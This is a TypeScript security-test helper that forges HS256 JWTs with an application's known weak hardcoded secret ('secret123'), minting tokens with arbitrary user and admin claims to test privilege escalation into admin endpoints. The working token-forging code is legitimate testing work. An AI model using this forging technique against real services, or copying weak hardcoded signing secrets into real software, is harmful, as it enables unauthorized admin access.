import { createHmac } from 'crypto';

/**
 * JWT Forging Helper
 *
 * The application signs auth tokens with a hardcoded, weak HS256 secret
 * (`auth.py` — `JWT_SECRET = "secret123"`, flagged in-code as
 * "Vulnerability: Using a weak secret key"). Knowing that secret, anyone can
 * mint a token claiming any `user_id` / `is_admin` value without ever
 * authenticating as an admin.
 *
 * This helper mints such a token so security tests can prove whether that
 * theoretical weakness is exploitable end-to-end (privilege escalation into
 * admin-only endpoints like /admin/approve_loan).
 */
const KNOWN_WEAK_JWT_SECRET = 'secret123';

function base64url(input: Buffer | string): string {
	return Buffer.from(input)
		.toString('base64')
		.replace(/=+$/, '')
		.replace(/\+/g, '-')
		.replace(/\//g, '_');
}

export function forgeToken(claims: { userId: number; username: string; isAdmin: boolean }): string {
	const header = { alg: 'HS256', typ: 'JWT' };
	const payload = {
		user_id: claims.userId,
		username: claims.username,
		is_admin: claims.isAdmin,
		iat: Math.floor(Date.now() / 1000)
	};

	const signingInput = `${base64url(JSON.stringify(header))}.${base64url(JSON.stringify(payload))}`;
	const signature = base64url(createHmac('sha256', KNOWN_WEAK_JWT_SECRET).update(signingInput).digest());
	return `${signingInput}.${signature}`;
}
